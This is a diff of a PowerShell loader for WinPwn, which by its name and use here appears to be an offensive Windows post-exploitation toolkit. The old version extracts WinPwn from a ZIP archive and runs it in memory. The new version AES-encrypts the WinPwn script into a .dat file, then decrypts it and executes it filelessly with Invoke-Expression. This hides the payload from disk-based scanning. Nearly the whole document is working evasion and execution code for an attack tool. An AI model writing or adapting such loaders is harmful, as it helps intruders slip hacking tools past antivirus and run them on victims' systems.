@@ -1,29 +1,52 @@
-# Load required .NET assemblies
-Add-Type -AssemblyName System.IO.Compression
-Add-Type -AssemblyName System.IO.Compression.FileSystem
+# Set variables
+$FileToEncrypt = "C:\Path\To\Offline_WinPwn.ps1"   # File to encrypt
+$EncryptedFile = "C:\Path\To\Encrypted.dat"        # Output encrypted file
+$Password = "YourStrongPassword"
 
-# Open ZIP archive
-$zipArchive = [System.IO.Compression.ZipFile]::OpenRead($zipFilePath)
+# Function to encrypt a file
+function Encrypt-File {
+    param ($InputFile, $OutputFile, $Password)
 
-# Find and run PS1 script
-$ps1Entry = $zipArchive.Entries | Where-Object { $_.FullName -match '\.ps1$' }
-if ($ps1Entry) {
-    $ps1Stream = $ps1Entry.Open()
-    $reader = New-Object System.IO.StreamReader($ps1Stream)
-    $ps1Content = $reader.ReadToEnd()
-    $reader.Close()
-    Invoke-Expression $ps1Content  # Run PS1 in memory
+    # Read file bytes
+    $Bytes = [System.IO.File]::ReadAllBytes($InputFile)
+    
+    # Generate AES key & IV from password
+    $AES = [System.Security.Cryptography.AesManaged]::new()
+    $AES.Key = (New-Object Security.Cryptography.Rfc2898DeriveBytes($Password, 16)).GetBytes(32)
+    $AES.IV = (New-Object Security.Cryptography.Rfc2898DeriveBytes($Password, 16)).GetBytes(16)
+    $Encryptor = $AES.CreateEncryptor()
+
+    # Encrypt and write to file
+    $Encrypted = $Encryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length)
+    [System.IO.File]::WriteAllBytes($OutputFile, $Encrypted)
+    
+    Write-Host "[+] File encrypted: $OutputFile"
 }
 
-# Find and run WinPwn script
-$winPwnEntry = $zipArchive.Entries | Where-Object { $_.FullName -match 'WinPwn' }
-if ($winPwnEntry) {
-    $winPwnStream = $winPwnEntry.Open()
-    $reader = New-Object System.IO.StreamReader($winPwnStream)
-    $winPwnContent = $reader.ReadToEnd()
-    $reader.Close()
-    Invoke-Expression $winPwnContent  # Run WinPwn in memory
+# Function to decrypt and execute PS1 in-memory
+function Decrypt-RunPS1 {
+    param ($EncryptedFile, $Password)
+
+    # Read encrypted file
+    $Encrypted = [System.IO.File]::ReadAllBytes($EncryptedFile)
+
+    # Generate AES key & IV from password
+    $AES = [System.Security.Cryptography.AesManaged]::new()
+    $AES.Key = (New-Object Security.Cryptography.Rfc2898DeriveBytes($Password, 16)).GetBytes(32)
+    $AES.IV = (New-Object Security.Cryptography.Rfc2898DeriveBytes($Password, 16)).GetBytes(16)
+    $Decryptor = $AES.CreateDecryptor()
+
+    # Decrypt file
+    $Decrypted = $Decryptor.TransformFinalBlock($Encrypted, 0, $Encrypted.Length)
+    $DecryptedText = [System.Text.Encoding]::UTF8.GetString($Decrypted)
+
+    # Execute script in memory
+    Invoke-Expression $DecryptedText
+    WinPwn  # Execute WinPwn immediately
 }
 
-# Cleanup
-$zipArchive.Dispose()
+# Encrypt file
+Encrypt-File -InputFile $FileToEncrypt -OutputFile $EncryptedFile -Password $Password
+
+# Decrypt and execute file
+Decrypt-RunPS1 -EncryptedFile $EncryptedFile -Password $Password
